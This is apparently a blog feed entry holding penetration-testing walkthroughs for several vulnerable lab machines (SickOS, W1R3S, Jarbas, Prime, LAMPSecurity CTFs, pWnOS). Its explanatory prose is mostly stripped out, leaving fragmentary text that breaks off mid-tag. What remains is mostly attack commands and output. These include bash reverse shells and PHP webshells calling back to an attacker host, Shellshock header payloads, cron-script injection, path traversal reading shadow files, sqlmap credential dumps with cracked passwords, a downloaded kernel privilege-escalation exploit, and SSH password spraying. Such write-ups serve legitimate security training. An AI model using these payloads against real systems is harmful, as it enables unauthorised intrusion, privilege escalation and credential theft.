    <content type="html"><![CDATA[<p><strong></strong></p><p><code>vulnhub</code>()</p><p><strong>HTB</strong></p><h1 id="nmap"><a class="markdownIt-Anchor" href="#nmap"></a> nmap</h1><p></p><h1 id="sickos11"><a class="markdownIt-Anchor" href="#sickos11"></a> SickOS1.1</h1><p><code></code><code>NAT</code><br /><br /><img src="https://picx.zhimg.com/80/v2-21c08ac76a33163198a021514062757c_1440w.png" alt="" /></p><h2 id=""><a class="markdownIt-Anchor" href="#"></a> </h2><p><code>ip a</code><code>kali</code><code>ip</code><br /><code>nmap -sn 192.168.32.0/24</code><br /><code>ip</code><br /><code>10000</code><code>-p-</code><strong></strong><br /><code>nmap --min-rate 10000 -p- 192.168.32.129</code><br /><img src="https://pic1.zhimg.com/80/v2-82d47efe9e72e894d16067edb8ac4171_1440w.png" alt="" /><br />22<code>ssh</code>3128<code>squid-http</code>8080<code>http</code><br /><code>tcp</code><code>-sT</code>TCP<code>-sV</code><code>-O</code><code>-p</code><br /><img src="https://pica.zhimg.com/80/v2-7f9f07fd0dc6498906a9cff77ca3508a_1440w.png" alt="" /></p><p><code>UDP</code><br /><code>nmap -sU -p22,3128,8080 192.168.32.129</code><br /><img src="https://picx.zhimg.com/80/v2-8afcd761d67cfbf54242e06960b1a311_1440w.png" alt="" /><br /></p><p><code>nmap</code><br /><code>nmap --script=vuln -p22,3128,8080 192.168.32.129</code><br /></p><p>8080<code>web</code>3128<code>http</code>22<code>ssh</code></p><p><code>squid</code><code>squid/3.1.19</code><code>CVE</code></p><h2 id=""><a class="markdownIt-Anchor" href="#"></a> </h2><p><code>dirb http://192.168.32.129 -p http://192.168.32.129:3128</code><br /><img src="https://picx.zhimg.com/80/v2-f4223785ce4f09a6f4ff5def3ad49535_1440w.png" alt="" /></p><h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> web</h2><p>(<code>proxy</code>)<br /><img src="https://picx.zhimg.com/80/v2-01c5ab3134851be70aeac2b4f163fba9_1440w.png" alt="" /><br /><code>robots.txt</code><code>/wolfcms</code><br /><code>cms</code><strong></strong><code>admin</code></p><p><code>/wolfcms/?/admin/login</code><code>admin/admin</code><br /><img src="https://picx.zhimg.com/80/v2-e2a9ffcf2bd7b28a66f28b3458da0627_1440w.png" alt="" /></p><h2 id="shell"><a class="markdownIt-Anchor" href="#shell"></a> shell</h2><p><code>php</code><code>shell</code><code>&lt;?php exec(&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.32.128/2333 0&gt;&amp;1'&quot;); ?&gt;</code><br /><br /><code>kali</code><code>2333</code></p><p><img src="https://pic1.zhimg.com/80/v2-76a4d4e13c1081d3f78a86f48f9e161f_1440w.png" alt="" /><br /><code>mysql</code><code>/etc/passwd</code><br /><code>root sickos www-data</code><code>root sickos</code><code>/bin/bash</code><code>sickos</code><code>ssh</code></p><p><code>sickos/john@123</code><code>sudo su</code></p><h2 id="nikto"><a class="markdownIt-Anchor" href="#nikto"></a> nikto</h2><p></p><p><code>nikto</code><br /><code>nikto</code></p><p><br /><code>nikto -h 192.168.32.129 -useproxy http://192.168.32.129:3128</code><br /><code>/cgi-bin/status</code><code>ShellShock</code><br /><img src="https://picx.zhimg.com/80/v2-e2f1b88e8ac8388804e26b0cf310850f_1440w.png" alt="" /><br /><code>Shellshock</code><code>Bashdoor</code><code>Unix</code><code>Bash shell</code>2014924<code>bash</code><code>Bash</code></p><h2 id="shellshock"><a class="markdownIt-Anchor" href="#shellshock"></a> shellshock</h2><p><code>Referer</code></p><p><code>curl -v --proxy http://192.168.32.129:3128 http://192.168.32.129/cgi-bin/status -H &quot;Referer:() &#123; test;&#125;; echo 'Content-Type: text/plain'; echo; echo; /usr/bin/id;exit&quot;</code><br /></p><p><code>shell</code></p><p><code>bashshell</code><br /><code>msfvenom -p cmd/unix/reverse_bash lhost=192.168.32.128 lport=2333 -f raw</code></p><p><code>curl -v --proxy http://192.168.32.129:3128 http://192.168.32.129/cgi-bin/status -H &quot;Referer:() &#123; test;&#125;; 0&lt;&amp;113-;exec 113&lt;&gt;/dev/tcp/192.168.32.128/2333;/bin/sh &lt;&amp;113 &gt;&amp;113 2&gt;&amp;113&quot;</code></p><p><code>kali</code><code>nc lvnp 2333</code></p><p><code></code><code>Python</code><code>shell</code><br /><code>dpkg -l</code></p><p><code>python -c &quot;import pty;pty.spawn('/bin/bash')&quot;</code></p><p><code>cd /var/www</code><br /><code>ls -al</code><br /><code>connect.py</code><code>777</code><strong></strong><strong></strong><br /><strong></strong></p><h2 id=""><a class="markdownIt-Anchor" href="#"></a> </h2><p><code>cd /etc</code><br /><code>ls -al | grep &quot;cron&quot;</code><br /><code>cd cron.d</code><br /><code>cat automate</code><br /><code>root</code><code>connect.py</code><code>Pythonshell</code><code>connect.py</code><code>root</code></p><p><code>msfvenom -p cmd/unix/reverse_python lhost=192.168.32.128 lport=2333 -f raw</code></p><p><code>kali</code></p><h2 id=""><a class="markdownIt-Anchor" href="#"></a> </h2><p><strong></strong><strong></strong><strong></strong></p><h1 id="w1r3s101"><a class="markdownIt-Anchor" href="#w1r3s101"></a> W1R3S1.01</h1><h2 id="-2"><a class="markdownIt-Anchor" href="#-2"></a> </h2><p><code>ubuntu16</code></p><p><code>nmap -sn 192.168.32.0/24</code><br /><code>192.168.32.130</code><br /><code>nmap --min-rate 10000 -p- 192.168.32.130</code><br />21<code>ftp</code>22<code>ssh</code>80<code>http</code>3306<code>mysql</code><br /><img src="https://picx.zhimg.com/80/v2-51ee067e4460f2642cb867c77575205c_1440w.png" alt="" /><br /><code>wordpress</code></p><p><code>ftp</code><code>get</code></p><p><code>wordpress</code><code>localhost</code></p><h2 id="-2"><a class="markdownIt-Anchor" href="#-2"></a> </h2><p><code>dirsearch</code><code>kali</code><code>dirb</code><code>python ./dirsearch.py -u 192.168.32.130</code></p><p><code>http://192.168.32.130/administrator/installation/</code><code>Cuppa CMS</code><code>CMS</code></p><h2 id="web-2"><a class="markdownIt-Anchor" href="#web-2"></a> web</h2><p><code>searchsploit cuppa</code><code>/alertConfigField.php</code><strong>/</strong><br /><code>searchsploit cuppa -m 25971.txt</code></p><p><code>http://192.168.32.130/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</code></p><p><code>POST</code><code>curl</code><br /><code>curl -X POST -d &quot;urlConfig=../../../../../../../../../etc/passwd&quot; http://192.168.32.130/administrator/alerts/alertConfigField.php</code><br /><code>/etc/shadow</code><code>passwd</code><code>x</code><br /></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::</span><br><span class="line">www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::</span><br><span class="line">w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::</span><br></pre></td></tr></table></figure><p></p><h2 id=""><a class="markdownIt-Anchor" href="#"></a> </h2><p><strong>john</strong><br /><img src="https://picx.zhimg.com/80/v2-6bfd16e3f6ad3646ca21319b27dbf523_1440w.png" alt="" /><br /></p><h2 id="-2"><a class="markdownIt-Anchor" href="#-2"></a> </h2><p><code>cuppa</code></p><h1 id="jarbas"><a class="markdownIt-Anchor" href="#jarbas"></a> jarbas</h1><h2 id=""><a class="markdownIt-Anchor" href="#"></a> </h2><p><code>centos7</code><br /><code>nmap -sn 192.168.32.0/24</code><br /><code>192.168.32.131</code><br /><code>nmap --min-rate 10000 -p- 102.168.32.131</code><br /><code>22 80 3306</code><br /><code>TCP UDP</code><code>nmap</code></p><h2 id="-3"><a class="markdownIt-Anchor" href="#-3"></a> </h2><p><code>dirb http://192.168.32.131</code><br /><code>dirb http://192.168.32.131 -X .php,.html</code><code>access.html</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tiago:5978a63b4654c73c60fa24f836386d87</span><br><span class="line">trindade:f463f63616cb3f1e81ce46b39f882fd5</span><br><span class="line">eder:9b38e2b1e8b12f426b0d208a7ab6cb98</span><br></pre></td></tr></table></figure><p><a href="https://hashes.com/en/decrypt/hash"></a><br /><code>italia99 vipsu marianna</code></p><h2 id="web-3"><a class="markdownIt-Anchor" href="#web-3"></a> web</h2><p><code>8080</code><br /><code>eder vipsu</code><br /><br /><img src="https://picx.zhimg.com/80/v2-ac6ce63ef84ebf1e3083feeca7f59d12_1440w.png" alt="" /><br /><code>bash -i &gt;&amp; /dev/tcp/192.168.32.128/2333 0&gt;&amp;1</code><br /><code>whoami</code><code>jenkins</code><code>/etc/passwd</code><code>root ede</code>r<code>/bin/bash</code><code>/etc/shadow</code><br /><strong></strong></p><h2 id="-2"><a class="markdownIt-Anchor" href="#-2"></a> </h2><p><code>cat /etc/crontab</code><br /><img src="https://picx.zhimg.com/80/v2-e75274d832efe214ad63a2888cfe88f9_1440w.png" alt="" /><br /><strong>root</strong><code>sh</code><br /><strong>777</strong><code>shell</code><br /><code>echo 'bash -i &gt;&amp; /dev/tcp/192.168.32.128/233 0&gt;&amp;1' &gt;&gt; /etc/script/CleaningScript.sh</code><br /><code>kali</code><code>233</code><br /><strong></strong></p><h2 id="-3"><a class="markdownIt-Anchor" href="#-3"></a> </h2><p><strong></strong></p><h1 id="primes"><a class="markdownIt-Anchor" href="#primes"></a> primes</h1><p><code>OSCP</code></p><h2 id="-2"><a class="markdownIt-Anchor" href="#-2"></a> </h2><p><code>nmap -sn 192.168.32.0/24</code><br /><code>nmap --min-rate 10000 -p- 192.168.32.132</code><br />2280<br /><code>TCP UDP</code><code>vuln</code><code>wordpress cms</code></p><h2 id="-4"><a class="markdownIt-Anchor" href="#-4"></a> </h2><p><code>dirb http://192.168.32.132</code><br /><code>/dev</code> <code>/wordpress/wp-admin</code><code>/dev</code>()</p><p><br /><code>dirb http://192.168.32.132 -X .zip,.txt,.php</code><br /><code>/image.php</code> <code>/index.php</code> <code>/secret.txt</code></p><p><code>/secret.txt</code><code>php</code><code>fuzz</code><strong></strong><code>wfuzz</code><code>kali</code><code>location.txt</code></p><h2 id="web-4"><a class="markdownIt-Anchor" href="#web-4"></a> web</h2><p><code>wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hh 136 ``http://192.168.32.132/index.php?FUZZ=</code></p><p><code>file</code><code>/index.php?file=location.txt</code><br /><code>/image.php</code><code>secrettier360</code></p><p><strong></strong><strong></strong></p><p><code>/bin/bash</code><code>root victor guest-w3z5e1</code></p><p><code>shadow</code><br /><code>saket:x:1001:1001:find password.txt file in my directory:/home/saket:</code></p><p><code>/home/saket/password.txt</code><code>follow_the_ippsec</code><br /><code>ssh</code><code>wordpress</code></p><p><code>/wordpress</code><code>victor</code><br /><code>/wordpress/wp-login.php</code><br /></p><p><code>php</code><code>http://192.168.32.132/wordpress/wp-admin/theme-editor.php?file=secret.php&amp;theme=twentynineteen</code></p><p><strong></strong><br /><code>shell</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.32.128/2333 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p></p><p><br /><code>http://192.168.32.132/wordpress/wp-content/themes/twentynineteen/secret.php</code></p><p><code>sudo -l</code></p><p><code>/home/saket/enc</code><br /><code>/root/t.sh</code></p><h2 id=""><a class="markdownIt-Anchor" href="#"></a> </h2><p><code>uname -a</code><code>Linux</code><code>Linux ubuntu 4.10.0-28-generic #32~16.04.2-Ubuntu</code></p><p><code>searchsploit Linux ubuntu 4.10.0-28</code><br /><img src="https://picx.zhimg.com/80/v2-e9c08ae405ec638d38b3ba00478c4043_1440w.png" alt="" /><br /><strong></strong><br /><code>searchsploit -m 45010.c</code></p><p><code>gcc</code><code>wget</code><br /><code>kali</code><code>web</code><code>php -S 0:80</code></p><p><code>/tmp</code>()<code>wget http://192.168.32.128/45010.c</code><br /><code>gcc</code><code>gcc 45010.c -o getshell</code><code>./getshell</code></p><p><code>dpkg -l | grep &quot;python&quot;</code><br /><code>python -c &quot;import pty;pty.spawn('/bin/bash')&quot;</code><br /><code>cat /root/root.txt</code></p><h2 id="openssl"><a class="markdownIt-Anchor" href="#openssl"></a> OpenSSL</h2><p></p><p><code>www-data</code><code>python -c &quot;import pty;pty.spawn('/bin/bash')&quot;</code> <code>sudo -l</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User www-data may run the following commands on ubuntu:</span><br><span class="line">    (root) NOPASSWD: /home/saket/enc</span><br></pre></td></tr></table></figure><p><code>root</code><code>enc</code><br /><strong></strong><code>find / -name &quot;*backup*&quot; 2&gt;dev/null</code></p><p><code>/var/backups</code><code>passwd.bak</code> <code>shadow.bak</code></p><p><code>cat /opt/backup/server_database/backup_pass</code><code>backup_password</code></p><p><code>./enc</code>good<br /></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/cp: cannot stat &#x27;/root/enc.txt&#x27;: Permission denied</span><br><span class="line">/bin/cp: cannot stat &#x27;/root/key.txt&#x27;: Permission denied</span><br></pre></td></tr></table></figure><p><br /><code>sudo ./enc</code><br /><code>/home/saket</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">I know you are the fan of ippsec.</span><br><span class="line"></span><br><span class="line">So convert string &quot;ippsec&quot; into md5 hash and use it to gain yourself in your real form.</span><br></pre></td></tr></table></figure><p><code>ippsec</code><code>MD5</code><code>16</code><br /><code>echo -n 'ippsec' | md5sum | awk -F ' ' '&#123;print $1;&#125;' | tr -d '\n' | od -A n -t x1| tr -d '\n' | tr -d ' '</code></p><p><code>openssl -h</code><code>enc</code><code>CipherTypeRaw</code><br /><code>vim CipherTypeRaw</code></p><p><code>awk '&#123;gsub(&quot; &quot;,&quot;\n&quot;);print&#125;' CipherTypeRaw | sort | uniq &gt; CipherTypes</code></p><p><code>for cipher in $(cat CipherTypes); do echo &quot;nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=&quot; | openssl enc -d -a -$cipher -K 3336366137346362336339353964653137643631646233303539316333396431 2&gt;/dev/null;echo $cipher;done</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dont worry saket one day we will reach to</span><br><span class="line">our destination very soon. And if you forget </span><br><span class="line">your username then use your old password</span><br><span class="line">==&gt; &quot;tribute_to_ippsec&quot;</span><br><span class="line"></span><br><span class="line">Victor,aes-256-ecb</span><br></pre></td></tr></table></figure><p><code>saket/tribute_to_ippsec</code><code>ssh saket@192.168.32.132</code> <code>sudo -l</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User saket may run the following commands on ubuntu:</span><br><span class="line">    (root) NOPASSWD: /home/victor/undefeated_victor</span><br></pre></td></tr></table></figure><p><code>sudo /bin/bash</code><br /><code>Sorry, user saket is not allowed to execute '/bin/bash' as root on ubuntu.</code></p><p><code>sudo /home/victor/undefeated_victor</code><code>if you can defeat me then challenge me in front of you /home/victor/undefeated_victor: 2: /home/victor/undefeated_victor: /tmp/challenge: not found</code></p><p><code>/tmp/challenge</code><code>/bin/bash</code><code>root</code><code>root</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;#!/bin/bash&#x27; &gt; /tmp/challenge</span><br><span class="line">echo &#x27;/bin/bash&#x27; &gt;&gt; /tmp/challenge</span><br><span class="line">chmod +x /tmp/challenge</span><br><span class="line">sudo /home/victor/undefeated_victor</span><br><span class="line">cat /root/root.txt</span><br></pre></td></tr></table></figure><h2 id="-4"><a class="markdownIt-Anchor" href="#-4"></a> </h2><p><code>OpenSSL</code></p><h1 id="lampsecurity-ctf4"><a class="markdownIt-Anchor" href="#lampsecurity-ctf4"></a> LAMPSecurity: CTF4</h1><h2 id="-3"><a class="markdownIt-Anchor" href="#-3"></a> </h2><p><code>192.168.32.133</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT    STATE  SERVICE</span><br><span class="line">22/tcp  open   ssh</span><br><span class="line">25/tcp  open   smtp</span><br><span class="line">80/tcp  open   http</span><br><span class="line">631/tcp closed ipp</span><br></pre></td></tr></table></figure><p><code>TCP UDP</code><br /><code>nmap</code><code>CSRFSQL</code></p><h2 id="web-5"><a class="markdownIt-Anchor" href="#web-5"></a> web</h2><p><code>/robots.txt</code><code>/mail</code><code>SquirreMail1.4.17</code><strong></strong><code>mysql</code><br /><code>http://192.168.32.133/index.html?page=blog&amp;title=Blog&amp;id=5</code></p><p><code>sqlmap</code><strong></strong><br /><code>sqlmap -u 'http://192.168.32.133/index.html?page=blog&amp;title=Blog&amp;id=5' --dbs --dump --batch</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Database: ehks                                                                                                 </span><br><span class="line">Table: user</span><br><span class="line">[6 entries]</span><br><span class="line">+---------+-----------+--------------------------------------------------+</span><br><span class="line">| user_id | user_name | user_pass                                        |</span><br><span class="line">+---------+-----------+--------------------------------------------------+</span><br><span class="line">| 1       | dstevens  | 02e823a15a392b5aa4ff4ccb9060fa68 (ilike2surf)    |</span><br><span class="line">| 2       | achen     | b46265f1e7faa3beab09db5c28739380 (seventysixers) |</span><br><span class="line">| 3       | pmoore    | 8f4743c04ed8e5f39166a81f26319bb5 (Homesite)      |</span><br><span class="line">| 4       | jdurbin   | 7c7bc9f465d86b8164686ebb5151a717 (Sue1978)       |</span><br><span class="line">| 5       | sorzek    | 64d1f88b9b276aece4b0edcc25b7a434 (pacman)        |</span><br><span class="line">| 6       | ghighland | 9f3eb3087298ff21843cc4e013cf355f (undone1)       |</span><br><span class="line">+---------+-----------+--------------------------------------------------+</span><br></pre></td></tr></table></figure><p><code>ssh</code><code>Kali</code><code>windows</code><br /><code>ssh -oKexAlgorithms=diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 -oHostKeyAlgorithms=ssh-rsa,ssh-dss dstevens@192.168.32.133 -o macs=hmac-sha1-96</code></p><p><code>sudo su</code><code>sudo /bin/bash</code><code>bash</code><code>root</code><code>root</code></p><h2 id="-5"><a class="markdownIt-Anchor" href="#-5"></a> </h2><p>()</p><h1 id="lampsecurity-ctf5"><a class="markdownIt-Anchor" href="#lampsecurity-ctf5"></a> LAMPSecurity: CTF5</h1><h2 id="-4"><a class="markdownIt-Anchor" href="#-4"></a> </h2><p><code>192.168.32.134</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">25/tcp    open  smtp</span><br><span class="line">80/tcp    open  http</span><br><span class="line">110/tcp   open  pop3</span><br><span class="line">111/tcp   open  rpcbind</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">143/tcp   open  imap</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">901/tcp   open  samba-swat</span><br><span class="line">3306/tcp  open  mysql</span><br><span class="line">54651/tcp open  unknown</span><br></pre></td></tr></table></figure><p><code>nmap</code></p><h2 id="web-6"><a class="markdownIt-Anchor" href="#web-6"></a> web</h2><p><code>web</code><code>Blo</code>g<code>NanoCM</code>S<code>admin</code><br /><code>cms</code><code>searchsploit nanocms</code></p><p><code>NanoCMS v0.4 - Remote Code Execution (RCE) (Authenticated)</code><br /></p><p>(<code>nanocms exploit</code><code>wp</code>)<code>NanoCMS '/data/pagesdata.txt' Password Hash Information Disclosure Vulnerability</code></p><p><code>s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:32:&quot;9d2f75377ac0ab991d40c91fd27e52fd&quot;;</code><br /><a href="https://www.somd5.com/">somd5</a><code>shannon</code></p><h2 id=""><a class="markdownIt-Anchor" href="#"></a> </h2><p>(<code>php</code>)<br /><code>&lt;?php exec(&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.32.128/2333 0&gt;&amp;1'&quot;); ?&gt;</code><br /></p><p><code>cat /etc/passwd</code><code>/bin/bash</code><code>shadow</code></p><p><code>ls -al</code><code>/home</code><code>patrick</code>tomboy<code>.tomboy.log</code><br /><code>12/5/2012 7:25:03 AM [DEBUG]: Saving 'Root password'...</code></p><p><code>pass</code>()<code>grep -R -i pass /home/* 2&gt;/dev/null</code></p><p><code>cat /home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note</code><br /><code>50$cent</code><br /><code>shell</code><code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code><br /><code>root</code><code>su root</code></p><h2 id="-6"><a class="markdownIt-Anchor" href="#-6"></a> </h2><p></p><h1 id="lampsecurity-ctf7"><a class="markdownIt-Anchor" href="#lampsecurity-ctf7"></a> LAMPSecurity: CTF7</h1><h2 id="-5"><a class="markdownIt-Anchor" href="#-5"></a> </h2><p>emmm<a href="https://blog.csdn.net/sinat_35845281/article/details/126067936"></a></p><p><code></code></p><p><code>192.168.32.135</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT      STATE  SERVICE</span><br><span class="line">22/tcp    open   ssh</span><br><span class="line">80/tcp    open   http</span><br><span class="line">137/tcp   closed netbios-ns</span><br><span class="line">138/tcp   closed netbios-dgm</span><br><span class="line">139/tcp   open   netbios-ssn</span><br><span class="line">901/tcp   open   samba-swat</span><br><span class="line">5900/tcp  closed vnc</span><br><span class="line">8080/tcp  open   http-proxy</span><br><span class="line">10000/tcp open   snet-sensor-mgmt</span><br></pre></td></tr></table></figure><p></p><h2 id="web-7"><a class="markdownIt-Anchor" href="#web-7"></a> web</h2><p><strong>80</strong><strong>SQL</strong></p><p><strong>8080</strong><br /><img src="https://pica.zhimg.com/80/v2-8724623d7c79244129100f1003ae1196_1440w.png" alt="" /><br /><code>&lt;!--select * from users where username='admin' AND password=md5('admin123') and is_admin=1--&gt;</code><br /><strong></strong><strong></strong><code>' or 1=1 #</code></p><p><code>http://192.168.32.135:8080/readings.php</code><strong>shell</strong><code>&lt;?php exec(&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.32.128/2333 0&gt;&amp;1'&quot;); ?&gt;</code></p><p><code>There was a problem uploading to /var/www/html/assets/</code><br /><code>/var/www/html/assets/</code></p><p><strong>shell</strong></p><p><code>http://192.168.32.135/assets/</code></p><h2 id="-2"><a class="markdownIt-Anchor" href="#-2"></a> </h2><p><code>python -c &quot;import pty;pty.spawn('/bin/bash')&quot;</code><strong>shell</strong></p><p><code>sudo -l</code> <br /><code>cat /etc/passwd</code><br /><code>cat /etc/shadow</code></p><p><code>web</code><code>/var/www/admin</code><code>/var/www/admin/inc/db.php</code><strong></strong><br /><code>mysql -u root -p</code><br /></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line">use website;</span><br><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure><p><br /><code>cat up | awk -F ' ' &#123;'print $4'&#125; &gt; password.txt</code></p><p><strong>rockyou</strong><code>sudo gzip -d /usr/share/wordlists/rockyou.txt.gz</code></p><p><code>hashcat -a 0 -m 0 password.txt /usr/share/wordlists/rockyou.txt</code><br /><code>hashcat</code><a href="https://www.cnblogs.com/micr067/p/16494384.html"></a>(1*42*2)4g(2g)</p><p><br /><code>cat pass.txt | awk -F ':' &#123;'print $2'&#125; &gt; password</code><br /><br /><code>cat up | awk -F ' ' &#123;'print $2'&#125; | awk -F '@' &#123;'print $1'&#125; &gt; username</code></p><h2 id="ssh"><a class="markdownIt-Anchor" href="#ssh"></a> ssh</h2><p><code>apt-get install crackmapexec</code></p><p><code>crackmapexec ssh 192.168.32.135 -u username -p password --continue-on-success</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">brian:my2cents</span><br><span class="line">alice:turtles77</span><br><span class="line">leon:qwer1234</span><br><span class="line">julia:madrid </span><br><span class="line">michael:somepassword</span><br><span class="line">charles:chuck33</span><br></pre></td></tr></table></figure><p><code>ssh -oKexAlgorithms=diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 -oHostKeyAlgorithms=ssh-rsa,ssh-dss brian@192.168.32.135 -o macs=hmac-sha1-96</code></p><p>root</p><h2 id="-7"><a class="markdownIt-Anchor" href="#-7"></a> </h2><ul><li></li><li>ssh<code>crackmapexec</code></li></ul><h1 id="pwnos20"><a class="markdownIt-Anchor" href="#pwnos20"></a> pWnOS2.0</h1><h2 id="-6"><a class="markdownIt-Anchor" href="#-6"></a> </h2><p><code>vmware</code><code>10.10.10.0</code><br /><code>nmap -sn 10.10.10.0/24</code><br /><strong>ip</strong><code>10.10.10.100</code></p><p><code>2280</code><code>vuln</code><strong></strong></p><h2 id="-5"><a class="markdownIt-Anchor" href="#-5"></a> </h2><p><code>/blog</code></p><h2 id="web-8"><a class="markdownIt-Anchor" href="#web-8"></a> web</h2><p><strong></strong></p><p><strong>sql</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r packet.txt --dbs </span><br><span class="line">sqlmap -r packet.txt -D ch16 --tables</span><br><span class="line">sqlmap -r packet.txt -D ch16 -T users --columns</span><br><span class="line">sqlmap -r packet.txt -D ch16 -T users -C first_name,last_name,pass --dump</span><br></pre></td></tr></table></figure><p><code>kali</code></p><p><code>/blog/rss.php</code><code>SPHPBLOG 0.4.0</code><code>index.ph</code>p<code>Simple PHP Blog 0.4.0</code><strong>cms</strong><code>whatweb</code><code>whatweb http://10.10.10.100/blog/</code></p><p><code>searchsploit Simple PHP Blog 0.4.0</code><br /><code>searchsploit Simple PHP Blog 0.4.0 -m 1191.pl</code><br /><code>perl</code><code>apt install libswitch-perl</code></p><p><code>perl 1191.pl</code><br /><code>perl 1191.pl -h http://10.10.10.100/blog -e 3 -U HvAng -P HvAng</code><br />122<strong></strong></p><p><code>new blog</code><strong>shell</strong></p><p><code>/blog/upload_img.php</code><code>&lt;?php exec(&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.10.128/2333 0&gt;&amp;1'&quot;);?&gt;</code><br /><code>shell.php</code><code>/blog/images</code></p><p><code>1</code><code>cmd.php</code><code>http://10.10.10.100/blog/images/cmd.php?cmd=</code></p><h2 id="-3"><a class="markdownIt-Anchor" href="#-3"></a> </h2><p><code>dpkg -l | grep python</code><br /><code>python -c &quot;import pty;pty.spawn('/bin/bash')&quot;</code><br /><code>/etc/passwd</code> <code>/etc/shadow</code> <code>/etc/crontab</code><code>Dan</code><code>/bin/bash</code><strong></strong><br /><code>cat /var/www/mysqli_connect.php</code><br /><code>mysql -u root -p</code><code>goodday</code><br /><code>find / -name 'mysqli_connect.php' 2&gt;/dev/null</code><code>/var/mysqli_connect.php</code><br /><code>root@ISIntS</code></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line">use ch16;</span><br><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure><p><code>Dan</code><strong></strong><code>c2c4b4e51d9e23c02c15702c136c3e950ba9a4af</code><code>killerbeesareflying</code><br /><br /><code>root</code><code>ssh root@10.10.10.100</code><code>root@ISIntS</code></p><h2 id="-8"><a class="markdownIt-Anchor" href="#-8"></a> </h2><p><strong></strong></p><h1 id="pwnos10"><a class="markdownIt-Anchor" href="#pwnos10"></a> pWnOS1.0</h1><h2 id="-7"><a class="markdownIt-Anchor" href="#-7"></a> </h2><p><strong></strong><br /><code>192.168.32.128</code><code>kali</code>129</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">10000/tcp open  snet-sensor-mgmt</span><br></pre></td></tr></table></figure><p></p><h2 id="web-9"><a class="markdownIt-Anchor" href="#web-9"></a> web</h2><p><br /><code>http://192.168.32.128/index1.php?help=true&amp;connect=</code><code>Warning: include()</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span 